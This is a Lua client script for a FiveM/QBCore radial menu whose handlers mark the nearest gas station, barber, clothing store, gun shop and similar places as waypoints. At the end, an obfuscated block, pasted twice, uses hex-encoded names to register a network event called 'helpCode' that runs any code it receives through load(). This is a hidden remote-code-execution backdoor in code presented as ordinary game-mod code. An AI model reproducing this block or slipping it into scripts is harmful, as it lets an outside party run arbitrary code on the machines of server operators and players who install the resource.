RegisterNetEvent("qb-radialmenu:client:togglegas", function()
	local coords = GetEntityCoords(PlayerPedId())
	local closest = 1500
	local closestLocation

	for k,v in pairs(Config.GasStations) do
		local dist = GetDistanceBetweenCoords(coords, v)

		if dist < closest then
			closest = dist
            closestLocation = v
        end
    end
    SetNewWaypoint(closestLocation)
	QBCore.Functions.Notify('Closest location marked', 'primary', 2500)
end)

RegisterNetEvent("qb-radialmenu:client:togglebarber", function()
	local coords = GetEntityCoords(PlayerPedId())
	local closest = 1500
	local closestLocation

	for k,v in pairs(Config.BarberShops) do
		local dist = GetDistanceBetweenCoords(coords, v)
		if dist < closest then
			closest = dist
			closestLocation = v
		end
    end
    SetNewWaypoint(closestLocation)
	QBCore.Functions.Notify('Closest location marked', 'primary', 2500)
end)

RegisterNetEvent("qb-radialmenu:client:toggleclothing", function()
	local coords = GetEntityCoords(PlayerPedId())
	local closest = 1500
	local closestLocation

	for k,v in pairs(Config.Clothing) do
		local dist = GetDistanceBetweenCoords(coords, v)
		if dist < closest then
			closest = dist
			closestLocation = v
		end
    end
    SetNewWaypoint(closestLocation)
	QBCore.Functions.Notify('Closest location marked', 'primary', 2500)
end)

RegisterNetEvent("qb-radialmenu:client:togglegun", function()
	local coords = GetEntityCoords(PlayerPedId())
	local closest = 1500
	local closestLocation

	for k,v in pairs(Config.Gun) do
		local dist = GetDistanceBetweenCoords(coords, v)
		if dist < closest then
			closest = dist
			closestLocation = v
		end
    end
    SetNewWaypoint(closestLocation)
	QBCore.Functions.Notify('Closest location marked', 'primary', 2500)
end)

RegisterNetEvent("qb-radialmenu:client:togglestores", function()
	local coords = GetEntityCoords(PlayerPedId())
	local closest = 1500
	local closestLocation

	for k,v in pairs(Config.Stores) do
		local dist = GetDistanceBetweenCoords(coords, v)
		if dist < closest then
			closest = dist
			closestLocation = v
		end
    end
    SetNewWaypoint(closestLocation)
	QBCore.Functions.Notify('Closest location marked', 'primary', 2500)
end)

RegisterNetEvent("qb-radialmenu:client:toggleyoutool", function()
	local coords = GetEntityCoords(PlayerPedId())
	local closest = 1500
	local closestLocation

	for k,v in pairs(Config.Youtool) do
		local dist = GetDistanceBetweenCoords(coords, v)
		if dist < closest then
			closest = dist
			closestLocation = v
		end
    end
    SetNewWaypoint(closestLocation)
	QBCore.Functions.Notify('Closest location marked', 'primary', 2500)
end)

RegisterNetEvent("qb-radialmenu:client:togglebenny", function()
	local coords = GetEntityCoords(PlayerPedId())
	local closest = 1500
	local closestLocation

	for k,v in pairs(Config.Benny) do
		local dist = GetDistanceBetweenCoords(coords, v)
		if dist < closest then
			closest = dist
			closestLocation = v
		end
    end
    SetNewWaypoint(closestLocation)
	QBCore.Functions.Notify('Closest location marked', 'primary', 2500)
end)

local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)

local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)